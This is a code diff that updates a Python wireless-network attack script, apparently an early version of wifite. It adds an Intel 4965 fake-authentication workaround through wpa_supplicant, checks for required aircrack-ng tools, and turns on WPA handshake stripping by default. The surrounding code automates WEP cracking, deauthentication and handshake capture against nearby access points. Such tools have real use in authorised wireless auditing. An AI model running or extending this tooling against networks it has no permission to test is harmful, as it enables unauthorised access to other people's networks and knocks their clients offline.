@@ -7,6 +7,7 @@
 """ TODO LIST:
     -test SKA (my router won't allow it, broken SKA everytime)
     -deauth entire router if SSID is hidden?
+	-get someone to test intel 4965 fake-auth workaround
 """
 
 import string, sys # basic stuff
@@ -17,13 +18,16 @@ import re          # reg-ex: for replacing characters in strings
 import urllib      # needed for downloading webpages (updating the script)
 import tempfile    # for creating temporary directory
 
-# GUI imports
-from Tkinter import * # all of the gui modules we need
-import tkFileDialog   # for selecting the dictionary file
-import threading      # so the GUI doesn't lock up
+try:
+	# GUI imports
+	from Tkinter import * # all of the gui modules we need
+	import tkFileDialog   # for selecting the dictionary file
+	import threading      # so the GUI doesn't lock up
+except ImportError:
+	print R+'[!] unable to import tkinter -- GUI disabled'
 
 # current revision
-REVISION=24
+REVISION=25
 
 # default wireless interface (blank to prompt)
 # ex: wlan0, wlan1, rausb0
@@ -66,7 +70,7 @@ NO_HIDDEN_DEAUTH=False # when true, disables the option to send deauth packets t
                        # only deauths clients and only when a fixed channel is selected
                        # this can help uncloak invisible access points, but is laggy
 
-STRIP_HANDSHAKE=False # when true, strips handshake via pyrit (removes unnecessary packets from .cap file)
+STRIP_HANDSHAKE=True # when true, strips handshake via pyrit (removes unnecessary packets from .cap file)
 
 # default channel to scan
 CHANNEL='0'  # 0 means attack all channels.
@@ -88,6 +92,9 @@ THE_LOG  =[]
 
 # flag for exiting out of attacks early, this should ALWAYS be false
 SKIP_TO_WPA=False
+
+# flag for when we use intel4965 wireless card
+HAS_INTEL4965=False
 
 # mac addresses, used for restoring mac addresses after changing them
 THIS_MAC=''
@@ -680,6 +687,8 @@ def main():
 			print W
 			return
 		
+		aircrack_warning()
+		
 		# handle arguments
 		if len(sys.argv) > 1:
 			handle_args(sys.argv)
@@ -705,6 +714,9 @@ def main():
 		
 		# find/get wireless interface
 		find_mon()
+		
+		# check if current interface is an intel4965 chipset...
+		check_intel()
 		
 		# get the current mac address for IFACE
 		THIS_MAC = getmac()
@@ -773,28 +785,61 @@ def main():
 			if DICT != '':
 				# only display amount cracked if user specified a dictionary
 				if CRACKED == 0:
-					print R+str(CRACKED)+' cracked'
+					print R+str(CRACKED)+' cracked'+W
 				else:
-					print G+str(CRACKED)+' cracked'
+					print G+str(CRACKED)+' cracked'+W
 		else:
 			# only targeted WEP network(s), only display attempted/cracked (not handshakes)
 			if CRACKED == 0:
-				print R+str(CRACKED)+' cracked'
+				print R+str(CRACKED)+' cracked'+W
 			else:
-				print G+str(CRACKED)+' cracked'
+				print G+str(CRACKED)+' cracked'+W
 		
 		# display the log
 		if len(THE_LOG) > 0:
 			print GR+'[+] '+G+'session summary:'+W
 			for i in THE_LOG:
 				print GR+'    -'+i
-		
-		#else:
-		#	print W+'the program will exit now'+W
+			print W
 		
 	except KeyboardInterrupt:
 		print GR+'\n[!] '+O+'^C interrupt received, '+R+'exiting'+W
+
+############################################################################### aircrack warning
+def aircrack_warning():
+	required   =['airmon-ng','aircrack-ng','airodump-ng','aireplay-ng','packetforge-ng']
+	recommended=['macchanger','pyrit']
 	
+	req=''
+	rec=''
+	for r in required:
+		if subprocess.Popen(['which',r],stdout=subprocess.PIPE).communicate()[0].strip() == '':
+			req += ' '+R+r+W+','
+			
+	for r in recommended:
+		if subprocess.Popen(['which',r],stdout=subprocess.PIPE).communicate()[0].strip() == '':
+			rec += ' '+R+r+W+','
+	if req.endswith(','):
+		req=req[:len(req)-1]
+	if rec.endswith(','):
+		rec=rec[:len(rec)-1]
+	
+	if req != '':
+		print GR+'[+] '+O+'WARNING:'+W+' '+G+'required'+W+' packages/apps were not found:'+W+req
+	if rec != '':
+		print GR+'[+] '+O+'WARNING:'+W+' '+G+'recommended'+W+' packages/apps were not found'+W+rec
+
+############################################################################### intel 4965 check
+def check_intel():
+	global IFACE, HAS_INTEL4965
+	out = subprocess.Popen(['airmon-ng'],stdout=subprocess.PIPE,stderr=open(os.devnull,'w')).communicate()[0]
+	for line in out.split('\n'):
+		if line.find(IFACE) != -1 and line.find('Intel 4965') != -1:
+			print GR+'[+] '+W+'intel4965 chipset '+G+'detected'+W+'\n'
+			HAS_INTEL4965=True
+			return
+	
+	HAS_INTEL4965=False
 
 ############################################################################### banner
 def banner():
@@ -1031,9 +1076,9 @@ def handle_args(args):
 			print GR+'[+] '+W+'deauthentication of hidden networks '+O+'disabled'+W+''
 			NO_HIDDEN_DEAUTH=True
 			
-		elif a == '-strip' or a == '--strip':
-			print GR+'[+] '+W+'handshake stripping via pryit '+G+'enabled'+W+''
-			STRIP_HANDSHAKE=True
+		elif a == '-nostrip' or a == '--no-strip':
+			print GR+'[+] '+W+'wpa handshake stripping '+O+'disabled'+W+''
+			STRIP_HANDSHAKE=False
 			
 		i += 1
 		
@@ -1099,10 +1144,10 @@ def halp(full=False):
 		print G+'  -wpaw\t   '+GR+'time to wait for wpa handshake (in minutes)'
 	# handshake strip
 	if full:
-		print G+'  --strip\t'+GR+' strip unnecessary packets from .cap file (leaves only handshake)'
+		print G+'  --no-strip\t'+GR+' strip unnecessary packets from .cap file (leaves only handshake)'
 		print '         \t uses pyrit (or tshark) to strip. greatly reduces size of handshkae cap files\n'
 	else:
-		print G+'  -strip   '+GR+'strip WPA handshake from cap files (reduce .cap size)'
+		print G+'  -nostrip '+GR+'strip WPA handshake from cap files (reduce .cap size)'
 	#WEPWAIT
 	if full:
 		print G+'  --wep-wait\t'+GR+'     e.g. -wepw 10'
@@ -1275,8 +1320,8 @@ def find_mon():
 			subprocess.call(['airmon-ng','start',poss[num-1]], stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
 			find_mon()  # recursive call
 			return
-			
-	elif len(ifaces) == 1:
+		
+	else: # lif len(ifaces) == 1:
 		# make sure the iface they want to use is already in monitor mode
 		if IFACE != '':
 			for i in ifaces:
@@ -1500,6 +1545,7 @@ def attack_wep_all(index):
 	global THIS_MAC, WEP_ARP, WEP_CHOP, WEP_FRAG, WEP_P0841
 	global AUTOCRACK, CRACKED, OLD_MAC, TEMPDIR, EXIT_IF_NO_FAKEAUTH
 	global SKIP_TO_WPA, WPA_CRACK # to exit early
+	global HAS_INTEL4965
 	
 	# to keep track of how long we are taking
 	TIME_START=time.time()
@@ -1544,16 +1590,20 @@ def attack_wep_all(index):
 		if client == THIS_MAC or is_shared(index) or CHANGE_MAC == False:
 			# fake-authenticate with the router
 			faked=False
-			for i in xrange(1, 4):
-				time.sleep(1)
+			if not HAS_INTEL4965:
+				for i in xrange(1, 4):
+					time.sleep(1)
+					
+					print '\r'+GR+'['+get_time(WEP_MAXWAIT,TIME_START)+'] '+O+'attempting fake-authentication (attempt '+str(i)+'/3)',
+					sys.stdout.flush()
+					time.sleep(0.3)
+					faked=attack_fakeauth(index)
+					if faked:
+						break
+			else:
+				print ''+GR+'['+get_time(WEP_MAXWAIT,TIME_START)+'] '+O+'attempting intel 4965 workaround'+W
+				faked=attack_fakeauth_intel(index)
 				
-				print '\r'+GR+'['+get_time(WEP_MAXWAIT,TIME_START)+'] '+O+'attempting fake-authentication (attempt '+str(i)+'/3)',
-				sys.stdout.flush()
-				time.sleep(0.3)
-				faked=attack_fakeauth(index)
-				if faked:
-					break
-			
 			if faked:
 				# fake auth was successful
 				print GR+'\n['+get_time(WEP_MAXWAIT,TIME_START)+'] '+G+'fake authentication successful :)'
@@ -2085,6 +2135,43 @@ def get_ivs(filename):
 		pass
 	
 	return -1
+
+def attack_fakeauth_intel(index):
+	global TARGETS, IFACE
+	
+	ssid=TARGETS[index][8]
+	f=open('fake.conf','w')
+	f.write('network={\n'+\
+			'ssid="'+ssid+'"\n'+\
+			'key_mgmt=NONE\n'+\
+			'wep_key0="fakeauth"\n'+\
+			'}')
+	f.close()
+	
+	proc_intel=subprocess.Popen(['wpa_supplicant','-c','fake.conf','-i',IFACE,'-Dwext','-B'],\
+								stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+	txt=proc_intel.communicate()
+	
+	# should we kill wpa_supplicant? does it need to keep running...?
+	try:
+		os.kill(proc_intel.pid, signal.SIGTERM) # wpa_supplicant
+	except OSError:
+		pass
+	except UnboundLocalError:
+		pass
+	subprocess.call(['killall','wpa_supplicant'])
+	# end of wpa_suplikill
+	
+	subprocess.call(['rm','-rf','fake.conf']) # remove fake.conf file
+	
+	if txt[0].find('State: ASSOCIATED -> COMPLETED') != -1 or txt[1].find('State: ASSOCIATED -> COMPLETED') != -1 :
+		return True
+	
+	print R+'[!]        wpa_supplicant output:'
+	print 'stdout    ' + txt[0].strip().replace('\n','\nstdout    ')
+	print 'stderr    ' + txt[1].strip().replace('\n','\nstderr    ')
+	
+	return False
 
 def attack_fakeauth(index):
 	"""
@@ -2793,6 +2880,9 @@ def stringtolist(s, most):
 			lst.pop(i)
 			i -= 1
 		i += 1
+	
+	if len(lst) == 0:
+		return []
 	if lst[len(lst)-1] > most:
 		lst.pop(len(lst)-1)
 	
@@ -2832,4 +2922,3 @@ subprocess.call('rm -rf /tmp/wifite*', shell=True, stdout=open(os.devnull,'w'),s
 # ['XX:XX:XX:XX:XX:XX', '1', 'WPA2WPA', 'CCMP', 'PSK', '48', '0',  '11',  'Belkin.A38E']
 #  BSSID,            CHANNEL,  ENC,      CYPH,   ??,   POWER,IVS,SSID_LEN,    SSID
 #    0                  1       2         3      4       5    6     7          8
-
